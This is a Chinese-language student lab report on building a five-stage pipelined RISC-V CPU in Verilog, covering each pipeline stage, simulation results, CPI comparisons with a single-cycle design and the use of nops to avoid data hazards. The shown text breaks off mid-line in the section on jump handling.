\u5b9e\u9a8c\u62a5\u544a\uff082022.09.22 ~ 2022.10.13\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 lab 1-1\uff1a\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a \u57fa\u4e8e lab 0 \u7684\u5355\u5468\u671f CPU \u642d\u5efa\u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a\uff0c\u652f\u6301 addi \u548c nop \u6307\u4ee4 \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u57fa\u672c\u529f\u80fd \u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u8bbe\u8ba1\u89c4\u8303 \u601d\u8003\u9898 \u5bf9\u4e8e part1 (2-14 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part1\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI \u5bf9\u4e8e part2 (24-39 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff08\u5047\u8bbe nop \u4e0d\u8ba1\u5165\u6307\u4ee4\u6761\u6570\uff09\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part2\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI\u3002\u8bd5\u89e3\u91ca\u4e3a\u4f55\u9700\u8981\u6dfb\u52a0 nop \u6307\u4ee4 lab 1-2\uff1a\u6307\u4ee4\u6269\u5c55 \u57fa\u4e8e lab 1-1\uff0c\u5728\u6d41\u6c34\u7ebf CPU \u4e2d\u5b9e\u73b0 lui\u3001jal\u3001jalr\u3001beq\u3001bne\u3001lw\u3001sw\u3001addi\u3001slti\u3001xori\u3001ori\u3001andi\u3001srli\u3001srai\u3001add\u3001sub\u3001sll\u3001slt\u3001sra\u3001or\u3001xor\u3001and \u6307\u4ee4 \u642d\u5efa\u5b8c\u6574\u7684\u6d41\u6c34\u7ebf CPU \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u6d4b\u8bd5 \u601d\u8003\u9898 \u5728\u4f60\u7684\u8bbe\u8ba1\u4e2d\uff0c\u672c\u5b9e\u9a8c\u6d4b\u8bd5\u6587\u4ef6\u4e2d\u7684 nop \u6570\u91cf\u662f\u5426\u591a\u4e8e\u6bcf\u6761\u6307\u4ee4\u6240\u9700\u7684\u5ef6\u8fdf\u5468\u671f\u6570 \u53c8\u662f\u5426\u5b58\u5728\u51fa\u73b0\u51b2\u7a81\u4f46\u662f\u6ca1\u6709\u7ed9\u8db3 nop \u7684\u60c5\u51b5 \u8bf7\u8ba1\u7b97\u6bcf\u6761\u6307\u4ee4\u95f4\u5b9e\u9645\u6240\u9700\u8981\u7684 nop \u6570\u91cf\uff0c\u5e76\u5bf9\u4f60\u7684 coe \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u4e4b\u6b63\u786e\u5730\u8fd0\u884c\u51fa\u76f8\u5e94\u7684\u7ed3\u679c \u6d41\u6c34\u7ebf\u52a0\u6cd5\u673a \u00b6 \u6570\u636e\u901a\u8def\u8bbe\u8ba1 \u00b6 \u4e4b\u524d\u7684\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1\uff08\u56e0\u4e3a\u6dfb\u52a0\u4e86 auipc \u6307\u4ee4\uff0c\u6240\u4ee5\u548c\u4e0a\u8bfe\u8bb2\u7684\u6709\u4e9b\u8bb8\u4e0d\u4e00\u6837\uff09\uff1a nop \u6307\u4ee4\u7f16\u8bd1\u540e\u76f8\u5f53\u4e8e addi x0, x0, 0\uff0c\u6240\u4ee5\u5373\u53ea\u5b58\u5728 addi \u6307\u4ee4\u3002\u5728\u8bbe\u8ba1\u6570\u636e\u901a\u8def\u65f6\u53ef\u4ee5\u5148\u7b80\u5316\u4e00\u4e0b\uff0c\u4e0d\u8003\u8651 pc \u7684\u8df3\u8f6c\u53d8\u5316\uff0c\u76f4\u63a5\u5728 IF \u9636\u6bb5\u4e0d\u65ad\u52a0\u56db\u5373\u53ef\u3002\u6240\u4ee5\u5728\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u7684\u57fa\u7840\u4e0a\u518d\u52a0\u4e0a\u56db\u4e2a\u9636\u6bb5\u5bc4\u5b58\u5668\u6765\u5206\u5272\u5373\u53ef\uff08\u5f88\u591a\u5176\u5b83\u6307\u4ee4\u7684\u7ec6\u8282\u4e5f\u8fdb\u884c\u4e86\u4fdd\u7559\uff0c\u4f46\u5728\u8fd9\u90e8\u5206\u4e2d\u4e0d\u4f1a\u7528\u5230\uff09\uff1a \u4ee3\u7801\u7f16\u5199 \u00b6 \u7531\u4e8e\u672c\u6b21\u5b9e\u9a8c\u4e0d\u5bf9\u6570\u636e\u901a\u8def\u8fdb\u884c\u5c01\u88c5\uff0c\u6240\u4ee5\u76f4\u63a5\u5728 SCPU \u4e2d\u8fdb\u884c\u4e0a\u8ff0\u8bbe\u8ba1\u7684\u5b9e\u73b0\u3002 IF \u6bb5 \u00b6 IF \u6bb5\u662f\u7531 PC \u548c IF/ID \u4e24\u4e2a\u5bc4\u5b58\u5668\uff08\u65f6\u5e8f\u7535\u8def\uff09\u5206\u9694\u7684\u3002\u5176\u4e2d\u4ece I-Mem \u8bfb\u53d6\u6307\u4ee4\u7684\u90e8\u5206\u5728 SCPU \u4e4b\u5916\uff0c\u4e5f\u5c31\u662f\u901a\u8fc7 pc_out \u4f20\u51fa\u5f53\u524d pc\uff0c\u7136\u540e\u5f97\u5230\u6307\u4ee4\u901a\u8fc7 inst \u8fd4\u56de\u5230 SCPU \u4e2d\u3002\u56e0\u4e3a Core \u4e2d\u4e3a ROM \u8bbe\u7f6e\u7684 clk \u4e0e SCPU \u6b63\u597d\u9519\u4f4d\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728 IF \u6240\u5728\u7684\u65f6\u949f\u5468\u671f\u4e2d\u76f4\u63a5\u5b8c\u6210\u6307\u4ee4\u7684\u8bfb\u53d6\u3002 \u4f53\u73b0\u5728\u4ee3\u7801\u4e0a\u5373\u5728\u4e0a\u5347\u6cbf\u65f6\u66f4\u65b0 pc \u4e3a pc_next\uff08pc+4\uff09\uff0c\u540c\u65f6\u66f4\u65b0 IF_ID_pc \u4e3a\u5f53\u524d\u672a\u66f4\u65b0\u7684 pc\uff08\u5373\u4f20\u7ed9\u4e0b\u4e00\u9636\u6bb5\uff09\uff0c\u4e5f\u540c\u65f6\u66f4\u65b0 IF_ID_inst \u4e3a\u5f53\u524d\u8bfb\u53d6\u51fa\u6765\u7684 inst\uff1a wire [ 31 : 0 ] pc_next ; reg [ 31 : 0 ] pc ; reg [ 31 : 0 ] IF_ID_pc ; reg [ 31 : 0 ] IF_ID_inst ; assign pc_out = pc ; assign pc_next = pc + 4 ; // \u4e0d\u8003\u8651\u8df3\u8f6c always @( posedge clk or posedge rst ) begin if ( rst ) begin pc <= 32 'b0 ; IF_ID_pc <= 32 'b0 ; end else begin pc <= pc_next ; IF_ID_pc <= pc ; IF_ID_inst <= inst ; end end ID \u6bb5 \u00b6 ID \u9636\u6bb5\u9700\u8981\u8fdb\u884c\u5bc4\u5b58\u5668\u7ec4\u7684\u8bbf\u95ee\u3001\u7acb\u5373\u6570\u751f\u6210\u4ee5\u53ca\u6307\u4ee4\u8bd1\u7801\uff0c\u4ece\u6570\u636e\u901a\u8def\u56fe\u4e0a\u53ef\u4ee5\u770b\u51fa\uff0c\u9664\u4e86\u63a7\u5236\u4fe1\u53f7\u4ee5\u5916\uff0c\u8f93\u51fa\u7ed9 ID/EX \u5bc4\u5b58\u5668\u7684\u503c\u6709 pc\u3001data1\u3001data2\u3001imm\u3001write_addr\u3002\u63a7\u5236\u4fe1\u53f7\u6709 pc_src\u3001mem_to_reg\u3001reg_write\u3001alu_src\u3001branch\u3001b_type\u3001auipc\u3001mem_write\u3002\u6240\u4ee5\u9700\u8981\u6839\u636e\u8fd9\u4e9b\u6765\u521b\u5efa ID/EX \u5bc4\u5b58\u5668\uff0c\u9644\u5e26\u4e2d\u95f4\u9700\u8981\u7528\u5230\u7684 wire\uff0c\u4ee3\u7801\u4e3a\uff1a wire [ 31 : 0 ] read_data1 , read_data2 , imm ; wire [ 3 : 0 ] alu_op ; wire [ 1 : 0 ] pc_src , mem_to_reg ; wire reg_write , alu_src , branch , b_type , auipc , mem_write_ ; reg [ 31 : 0 ] ID_EX_data1 , ID_EX_data2 ; reg [ 31 : 0 ] ID_EX_pc , ID_EX_imm ; reg [ 4 : 0 ] ID_EX_write_addr ; reg [ 3 : 0 ] ID_EX_alu_op ; reg [ 1 : 0 ] ID_EX_pc_src , ID_EX_mem_to_reg ; reg ID_EX_reg_write , ID_EX_alu_src , ID_EX_branch , ID_EX_b_type , ID_EX_auipc , ID_EX_mem_write ; \u4ee5\u53ca\u6d89\u53ca ID/EX \u5bc4\u5b58\u5668\u7684\u65f6\u5e8f\u66f4\u65b0\uff1a ID_EX_pc <= IF_ID_pc ; ID_EX_data1 <= read_data1 ; ID_EX_data2 <= read_data2 ; ID_EX_imm <= imm ; ID_EX_write_addr <= IF_ID_inst [ 11 : 7 ]; ID_EX_pc_src <= pc_src ; ID_EX_mem_to_reg <= mem_to_reg ; ID_EX_reg_write <= reg_write ; ID_EX_alu_src <= alu_src ; ID_EX_branch <= branch ; ID_EX_b_type <= b_type ; ID_EX_auipc <= auipc ; ID_EX_alu_op <= alu_op ; ID_EX_mem_write <= mem_write_ ; \u5269\u4e0b\u7684\u662f\u5728\u8fd9\u4e00\u9636\u6bb5\u4e2d\u8fde\u63a5\u4e09\u4e2a\u6a21\u5757\uff1aRegs\u3001Control\u3001ImmGen\u3002\u5bf9\u4e8e Regs\uff0c\u6709\u4e00\u90e8\u5206\u662f\u5728 WB \u9636\u6bb5\u7528\u4e8e\u5199\u56de\u7684\uff0c\u8fd9\u91cc\u5148\u653e\u4e0b\u7b49\u5230\u540e\u9762\u586b\u3002Control \u548c ImmGen \u548c\u5355\u5468\u671f CPU \u7684\u5199\u6cd5\u57fa\u672c\u4e00\u81f4\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u7684 inst \u8981\u6539\u6210 IF_ID_inst \u4e5f\u5c31\u662f IF/ID \u5bc4\u5b58\u5668\u4e2d\u5b58\u7684\u6307\u4ee4\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7684 inst\uff08\u540c\u4e00\u65f6\u523b\u4f1a\u662f\u540e\u4e00\u6761\u6307\u4ee4\uff09\uff1a Regs regs ( . clk ( clk ), . rst ( rst ), . we ( ____ ), // \u7559\u7ed9 WB \u9636\u6bb5 . read_addr_1 ( IF_ID_inst [ 19 : 15 ]), . read_addr_2 ( IF_ID_inst [ 24 : 20 ]), . write_addr ( ____ ), // \u7559\u7ed9 WB \u9636\u6bb5 . write_data ( ____ ), // \u7559\u7ed9 WB \u9636\u6bb5 . read_data_1 ( read_data1 ), . read_data_2 ( read_data2 ) ); Control control ( . op_code ( IF_ID_inst [ 6 : 0 ]), . funct3 ( IF_ID_inst [ 14 : 12 ]), . funct7_5 ( IF_ID_inst [ 30 ]), . alu_op ( alu_op ), . pc_src ( pc_src ), . mem_to_reg ( mem_to_reg ), . reg_write ( reg_write ), . alu_src_b ( alu_src ), . branch ( branch ), . b_type ( b_type ), . mem_write ( mem_write_ ), . auipc ( auipc ) ); ImmGen immgen ( . inst ( IF_ID_inst ), . imm ( imm ) ); EX \u6bb5 \u00b6 EX \u9636\u6bb5\u4e3b\u8981\u8fdb\u884c ALU \u8fd0\u7b97\uff0c\u6839\u636e\u6570\u636e\u901a\u8def\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u9636\u6bb5\u7684\u8f93\u51fa\uff08\u4e5f\u5c31\u662f EX/MEM \u5bc4\u5b58\u5668\u4e2d\u9700\u8981\u5b58\u7684\u503c\uff09\u6709 pc\u3001alu_result\u3001data2\u3001imm\u3001write_addr\u3002\u63a7\u5236\u4fe1\u53f7\u5728\u8fd9\u4e00\u9636\u6bb5\u4e2d\u4f7f\u7528\u6389\u4e86 alu_op\u3001alu_src_b \u548c auipc\uff0c\u5176\u4f59\u7684\u8fd8\u9700\u8981\u7ee7\u7eed\u901a\u8fc7 EX/MEM \u5bc4\u5b58\u5668\u4f20\u4e0b\u53bb\u3002\u56e0\u6b64 EX/MEM \u5bc4\u5b58\u5668\u4ee5\u53ca\u5176\u5b83\u4e2d\u95f4 wire \u7684\u5b9a\u4e49\uff1a wire [ 31 : 0 ] alu_data1 , alu_data2 , alu_result ; wire alu_zero ; reg [ 31 : 0 ] EX_MEM_alu_result , EX_MEM_pc , EX_MEM_imm ; reg [ 31 : 0 ] EX_MEM_data2 ; reg [ 4 : 0 ] EX_MEM_write_addr ; reg [ 1 : 0 ] EX_MEM_pc_src , EX_MEM_mem_to_reg ; reg EX_MEM_reg_write , EX_MEM_branch , EX_MEM_b_type , EX_MEM_mem_write ; \u76f8\u5173\u7684\u65f6\u5e8f\u903b\u8f91\u66f4\u65b0\uff1a EX_MEM_pc <= ID_EX_pc ; EX_MEM_imm <= ID_EX_imm ; EX_MEM_data2 <= ID_EX_data2 ; EX_MEM_alu_result <= alu_result ; EX_MEM_write_addr <= ID_EX_write_addr ; EX_MEM_pc_src <= ID_EX_pc_src ; EX_MEM_mem_to_reg <= ID_EX_mem_to_reg ; EX_MEM_reg_write <= ID_EX_reg_write ; EX_MEM_branch <= ID_EX_branch ; EX_MEM_b_type <= ID_EX_b_type ; EX_MEM_mem_write <= ID_EX_mem_write ; \u5728\u6211\u7684\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u4e2d\uff0c\u6b64\u9636\u6bb5\u9700\u8981\u4e24\u4e2a\u591a\u8def\u9009\u62e9\u5668\uff08\u4e00\u4e2a\u901a\u8fc7 auipc \u5728 data1 \u548c pc \u4e2d\u9009\u62e9\u7b2c\u4e00\u4e2a\u8f93\u5165\uff0c\u53e6\u4e00\u4e2a\u901a\u8fc7 alu_src_b \u5728 data2 \u548c imm \u4e2d\u9009\u62e9\u7b2c\u4e8c\u4e2a\u8f93\u5165\uff09\u8fd8\u6709\u4e00\u4e2a ALU\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u6a21\u5757\u7684\u5b9a\u4e49\uff1a Mux2x32 mux2x32_1 ( . I0 ( ID_EX_data1 ), . I1 ( ID_EX_pc ), . s ( ID_EX_auipc ), . o ( alu_data1 ) ); Mux2x32 mux2x32_2 ( . I0 ( ID_EX_data2 ), . I1 ( ID_EX_imm ), . s ( ID_EX_alu_src ), . o ( alu_data2 ) ); ALU alu ( . a ( alu_data1 ), . b ( alu_data2 ), . alu_op ( ID_EX_alu_op ), . res ( alu_result ), . zero ( alu_zero ) // \u5176\u5b9e\u6211\u6ca1\u7528 ); MEM \u6bb5 \u00b6 MEM \u9636\u6bb5\u9700\u8981\u8fdb\u884c D-Mem \u7684\u8bbf\u95ee\uff0c\u867d\u7136 addi \u6307\u4ee4\u4e0d\u4f1a\u6d89\u53ca\u5230 MEM \u9636\u6bb5\uff0c\u4f46\u662f\u5728\u6b64\u4e5f\u8fdb\u884c\u4e86\u8fd9\u4e00\u90e8\u5206\u5b9e\u73b0\u3002D-Mem \u4e5f\u5b9a\u4e49\u5728 SCPU \u4e4b\u5916\uff0c\u9700\u8981\u901a\u8fc7 SCPU \u7684\u63a5\u53e3\u6765\u8fdb\u884c\u8bbf\u95ee\uff0c\u5373\u901a\u8fc7 addr_out \u8fd9\u4e00\u8f93\u51fa\u6765\u8f93\u5165\u7ed9 RAM \u6307\u5b9a\u64cd\u4f5c\u7684\u5730\u5740\uff0cdata_out \u8f93\u51fa\u6765\u8f93\u5165\u7ed9 RAM \u6307\u5b9a\u5199\u5165\u7684\u6570\u636e\uff0c\u8f93\u51fa mem_write \u63a7\u5236\u4fe1\u53f7\u6765\u6307\u5b9a\u8fdb\u884c\u5199\u5165\u8fd8\u662f\u8bfb\u53d6\uff0c\u4ee5\u53ca RAM \u8f93\u51fa data_in \u7ed9 SCPU \u4f5c\u4e3a\u8bfb\u53d6\u7684\u6570\u636e\u3002\u6240\u4ee5 SCPU \u4e2d\u53ea\u9700\u8981 assign \u8fde\u7ebf\u5373\u53ef\uff1a assign addr_out = EX_MEM_alu_result ; assign data_out = EX_MEM_data2 ; assign mem_write = EX_MEM_mem_write ; \u4e0b\u4e00\u6b65\u662f\u8fdb\u884c MEM/WB \u5bc4\u5b58\u5668\u7684\u5199\u5165\u3002\u4ece\u6570\u636e\u901a\u8def\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u9700\u8981\u5199\u5165\u7684\u6570\u636e\u6709 pc\u3001alu_result\u3001data_in\u3001imm\u3001write_addr\u3002\u8fd9\u4e00\u9636\u6bb5\u7684\u63a7\u5236\u4fe1\u53f7\u7528\u6389\u4e86 mem_write\uff0c\u4f46\u662f\u540e\u7eed\u7684\u8df3\u8f6c\u8ba1\u7b97\u4e5f\u8ba1\u5212\u5728\u8fd9\u91cc\u5b8c\u6210\uff0c\u5c06\u6d88\u8017 branch\u3001b_type\u3001pc_src \u4e09\u4e2a\u4fe1\u53f7\uff0c\u6700\u540e WB \u9636\u6bb5\u4e2d\u4f1a\u4f7f\u7528\u5230\u7684\u4e5f\u53ea\u5269\u4e0b mem_to_reg \u548c reg_write \u4e24\u4e2a\u4e86\u3002\u56e0\u6b64\u5bc4\u5b58\u5668\u5b9a\u4e49\uff1a reg [ 31 : 0 ] MEM_WB_data_in , MEM_WB_alu_result , MEM_WB_pc , MEM_WB_imm ; reg [ 4 : 0 ] MEM_WB_write_addr ; reg [ 1 : 0 ] MEM_WB_mem_to_reg ; reg MEM_WB_reg_write ; \u4ee5\u53ca\u65f6\u5e8f\u66f4\u65b0\uff1a MEM_WB_data_in <= data_in ; MEM_WB_alu_result <= EX_MEM_alu_result ; MEM_WB_pc <= EX_MEM_pc ; MEM_WB_imm <= EX_MEM_imm ; MEM_WB_write_addr <= EX_MEM_write_addr ; MEM_WB_mem_to_reg <= EX_MEM_mem_to_reg ; MEM_WB_reg_write <= EX_MEM_reg_write ; WB \u6bb5 \u00b6 WB \u6bb5\u8fdb\u884c\u5bc4\u5b58\u5668\u7ec4\u7684\u5199\u56de\u64cd\u4f5c\uff0c\u9700\u8981\u590d\u7528 ID \u9636\u6bb5\u4e2d\u5b9a\u4e49\u8fde\u63a5\u7684 Regs \u6a21\u5757\uff0c\u4e5f\u5c31\u662f\u5148\u9009\u62e9\u51fa\u9700\u8981\u5199\u56de\u7684\u6570\u636e write_data\uff0c\u7136\u540e\u5199\u56de\u5728 write_addr \u5730\u5740\u5904\u7684\u5bc4\u5b58\u5668\u3002\u56e0\u6b64\u9700\u8981\u4e00\u4e2a wire \u53d8\u91cf write_data\u3002\u4e0d\u9700\u8981\u518d\u5b9a\u4e49\u989d\u5916\u7684\u5bc4\u5b58\u5668\u3002 \u5bf9\u4e8e write_data \u7684\u9009\u62e9\uff0c\u5176\u6765\u6e90\u6709\u56db\u4e2a\uff08\u5b8c\u6574\u60c5\u51b5\u4e0b\uff09\uff0c\u5206\u522b\u662f alu_result\u3001imm\u3001pc+4\u3001data_in\uff0c\u901a\u8fc7\u63a7\u5236\u4fe1\u53f7 mem_to_reg \u8fdb\u884c\u56db\u8def\u9009\u62e9\u5373\u53ef\uff1a Mux4x32 mux4x32 ( . I0 ( MEM_WB_alu_result ), . I1 ( MEM_WB_imm ), . I2 ( MEM_WB_pc + 4 ), . I3 ( MEM_WB_data_in ), . s ( MEM_WB_mem_to_reg ), . o ( write_data ) ); \u6700\u540e\u518d\u5c06 reg_write \u4fe1\u53f7\u3001write_addr\u3001write_data \u8fde\u5165 Regs \u6a21\u5757\u5373\u53ef\uff1a Regs regs ( ... . we ( MEM_WB_reg_write ), ... . write_addr ( MEM_WB_write_addr ), . write_data ( write_data ), ... ); \u4eff\u771f\u6d4b\u8bd5 \u00b6 \u6309\u7167\u4e4b\u524d\u7684\u6307\u5bfc\uff0c\u5c06 lab1-1.coe \u8f7d\u5165 ROM \u4e2d\uff0c\u7136\u540e\u4ee5 Core_tb \u4e3a\u9876\u5c42\u6a21\u5757\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u4eff\u771f\u7ed3\u679c\u6ce2\u5f62\u5982\u4e0b\uff08\u5305\u542b SCPU \u4e2d\u7684 clk \u4fe1\u53f7\u3001pc\u3001inst \u4ee5\u53ca\u5bc4\u5b58\u5668\u7684\u53d8\u5316\uff09\uff1a \u5bf9\u4e8e\u8fd9\u4e2a\u6ce2\u5f62\u7684\u5206\u6790\u5982\u4e0b\u56fe\uff08\u9ed1\u8272\u3001\u6a59\u8272\u65b9\u5757\u4e3a addi \u6307\u4ee4\uff0c\u7ea2\u8272\u65b9\u5757\u4e3a nop \u6307\u4ee4\uff09\uff1a \u53ef\u4ee5\u53d1\u73b0\uff0c\u6307\u4ee4\u786e\u5b9e\u53e0\u5728\u4e00\u8d77\u8fd0\u884c\uff0c\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u4e94\u4e2a\u5468\u671f\uff0c\u540c\u4e00\u5468\u671f\u5185\u8fd0\u884c\u4e94\u6761\u6307\u4ee4\uff0c\u5f62\u6210\u4e00\u4e2a\u4e94\u9636\u6d41\u6c34\u7ebf\uff0c\u4e14\u5bc4\u5b58\u5668\u4e2d\u7ed3\u679c\u53d8\u5316\u5747\u7b26\u5408\u9884\u671f\uff08\u5728\u6700\u540e\u4e00\u4e2a\u9636\u6bb5 WB \u5199\u56de\u4ea7\u751f\u53d8\u5316\uff0c\u4e14\u503c\u4e0e\u6c47\u7f16\u8bed\u53e5\u4e2d\u63cf\u8ff0\u76f8\u540c\uff09 \u601d\u8003\u9898 \u00b6 \u5bf9\u4e8e part1 (2-14 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part1\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI \u5bf9\u4e8e\u76ee\u524d\u7684\u6d41\u6c34\u7ebf CPU\uff0c\u5728 part1 \u90e8\u5206\uff0c\u901a\u8fc7\u4e0a\u9762\u7684\u6ce2\u5f62\u56fe\u53ef\u4ee5\u770b\u51fa\u8fd9 12 \u6761\u6307\u4ee4\u4e00\u5171\u8fd0\u884c\u4e86 16 \u4e2a\u5468\u671f\uff0c\u5176 CPI \u4e3a 16/12 = 1.33\u3002\u800c\u5728 lab0 \u4e2d\uff0cCPU \u4e3a\u5355\u5468\u671f\uff0c\u4e00\u4e2a\u5468\u671f\u4f1a\u8fd0\u884c\u4e00\u6761\u6307\u4ee4\uff0c\u6240\u4ee5\u5176 CPI \u4e3a 1\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u6d41\u6c34\u7ebf CPU \u7684 CPI \u662f\u4f1a\u5927\u4e8e\u5355\u5468\u671f CPU \u7684\uff0c\u4e14\u5f53\u8fd0\u884c\u6307\u4ee4\u6761\u6570\u8d8a\u591a\u65f6\uff0cCPI \u8d8a\u63a5\u8fd1\u5355\u5468\u671f\u7684 1\u3002 \u5bf9\u4e8e part2 (24-39 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff08\u5047\u8bbe nop \u4e0d\u8ba1\u5165\u6307\u4ee4\u6761\u6570\uff09\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part2\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI\u3002\u8bd5\u89e3\u91ca\u4e3a\u4f55\u9700\u8981\u6dfb\u52a0 nop \u6307\u4ee4 \u4ece\u4e0a\u6ce2\u5f62\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0cpart2 \u7684\u8fd9\u4e9b\u6307\u4ee4\u8fd0\u884c\u4e86 20 \u4e2a\u5468\u671f\uff0c\u9664\u53bb nop \u4ee5\u5916\u4e00\u5171\u56db\u6761\u6307\u4ee4\uff0cCPI \u4e3a 20/4 = 5\u3002\u800c lab0 \u4e2d\u7684 CPU \u4e3a\u5355\u5468\u671f\uff0c\u8fd0\u884c part2 \u7684\u8fd9\u4e9b\u6307\u4ee4\u9700\u8981 16 \u4e2a\u5468\u671f\uff0c\u6709\u6548 4 \u6761\uff0cCPI \u4e3a 16/4 = 4\uff08\u5982\u679c\u8fd0\u884c\u65f6\u9664\u53bb nop \u6307\u4ee4\uff0c\u5219 CPI \u4e3a 1\uff09\u3002\u53d1\u73b0\u6b64\u65f6\u6d41\u6c34\u7ebf CPU \u7684 CPI \u662f\u8981\u5927\u4e8e\u5355\u5468\u671f\u7684\u3002 \u6dfb\u52a0 nop \u6307\u4ee4\u7684\u539f\u56e0\u662f\u6b64\u65f6\u4f1a\u51fa\u73b0\u6570\u636e\u5192\u9669\uff0c\u5373\u5728\u6267\u884c\u7b2c\u4e00\u6761\u6307\u4ee4\u65f6\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u9700\u8981\u7528\u5230\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u7b2c\u4e00\u6761\u6307\u4ee4\u8fd8\u6ca1\u6709\u6267\u884c\u5b8c\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u5f85\u7b2c\u4e00\u6761\u6307\u4ee4\u6267\u884c\u5b8c\uff0c\u624d\u80fd\u6267\u884c\u7b2c\u4e8c\u6761\u6307\u4ee4\u3002\u5e76\u4e14\u76ee\u524d\u7684\u6d41\u6c34\u7ebf CPU \u4e2d\u6ca1\u6709\u8fdb\u884c\u6570\u636e\u5192\u9669\u7684\u5904\u7406\uff0c\u6240\u4ee5\u9700\u8981\u9760\u6dfb\u52a0 nop \u6307\u4ee4\u6765\u624b\u52a8\u6682\u505c\u907f\u514d\u5192\u9669\u3002 \u5b8c\u6574\u6d41\u6c34\u7ebf CPU \u00b6 \u6570\u636e\u901a\u8def \u00b6 \u5728\u524d\u9762\u7684\u7b80\u5316\u6570\u636e\u901a\u8def\u57fa\u7840\u4e0a\u8fdb\u884c\u66f4\u6539\uff0c\u9700\u8981\u4fee\u6539\u7684\u4ec5\u662f\u4e3a pc \u8d4b\u503c\u7684\u90e8\u5206\u3002\u91c7\u7528\u4e86\u548c lab0 \u4e2d\u76f8\u540c\u7684\u7528\u4e8e pc \u7684\u591a\u8def\u9009\u62e9\u5668\uff0c\u5176\u7ed3\u6784\u4e3a\uff1a input [ 31 : 0 ] I0 , // pc+4 input [ 31 : 0 ] I1 , // jalr \u7684\u5730\u5740 input [ 31 : 0 ] I2 , // jal \u7684\u5730\u5740 input [ 31 : 0 ] I3 , // branch \u7684\u5730\u5740\uff0c\u548c jal \u76f8\u540c input [ 1 : 0 ] s , // pc_src \u63a7\u5236\u4fe1\u53f7 input branch , // branch \u63a7\u5236\u4fe1\u53f7\uff08\u662f\u5426\u662f branch \u8bed\u53e5\uff09 input b_type , // b_type \u63a7\u5236\u4fe1\u53f7\uff080 \u8868\u793a bne\uff0c\u53cd\u4e4b beq\uff09 input [ 31 : 0 ] alu_res , // alu \u7684\u7ed3\u679c\uff08\u4f5c\u7528\u76f8\u5f53\u4e8e alu_zero\uff09 output [ 31 : 0 ] o // pc_next \u5728\u6b64\u5904 jalr/jal/branch \u7684\u5730\u5740\u90fd\u9700\u8981\u5230\u8fbe MEM \u9636\u6bb5\u624d\u53ef\u4ee5\u8ba1\u7b97\uff0c\u51e0\u4e2a\u63a7\u5236\u4fe1\u53f7\u4e5f\u662f\u5728 MEM \u9636\u6bb5\u7684\uff0c\u4e3a\u4e86\u9632\u6b62\u7b49\u5f85\uff0cpc+4 \u4e2d\u7684 pc \u4e0d\u5e94\u8be5\u662f MEM \u9636\u6bb5\u7684 pc\uff0c\u800c\u662f\u5f53\u524d\u65f6\u523b pc \u5bc4\u5b58\u5668\u4e2d\u7684 pc\uff0cpc_next \u4e5f\u4f1a\u76f4\u63a5\u5728\u4e0b\u4e00\u4e2a\u4e0a\u5347\u6cbf\u8d4b\u503c\u7ed9 pc\u3002\u56e0\u6b64\u9700\u8981\u4fdd\u8bc1\u9664\u4e86\u8df3\u8f6c\u4ee5\u5916\u7684\u5176\u5b83\u65f6\u523b\uff0cs\u3001branch \u7b49\u4fe1\u53f7\u90fd\u4e3a 0\uff08\u5373\u9009\u62e9 pc+4 \u4f5c\u4e3a pc_next\uff09\u3002\u800c\u4e00\u6761\u5305\u542b\u8df3\u8f6c\u7684\u6307\u4ee4\u8fd0\u884c\u5230 MEM \u65f6\uff0c\u4f1a\u6539\u53d8\u8fd9\u4e9b\u4fe1\u53f7\uff0c\u4ece\u800c\u5f71\u54cd pc_next\uff0c\u5b9e\u73b0\u8df3\u8f6c\u3002\u57fa\u4e8e\u6b64\u601d\u8def\uff0c\u6570\u636e\u901a\u8def\u4e3a\uff1a \u4ee3\u7801\u5b9e\u73b0 \u00b6 \u9996\u5148\u9700\u8981\u5220\u6389\u524d\u9762\u5199\u7684 assign pc_next = pc+4; \u7136\u540e\u589e\u52a0\u521b\u5efa\u5e76\u8fde\u63a5 MuxPC \u6a21\u5757\uff1a wire [ 31 : 0 ] jal_addr , jalr_addr ; //--------------------MEM--------------------// assign addr_out = EX_MEM_alu_result ; assign data_out = EX_MEM_data2 ; assign mem_write = 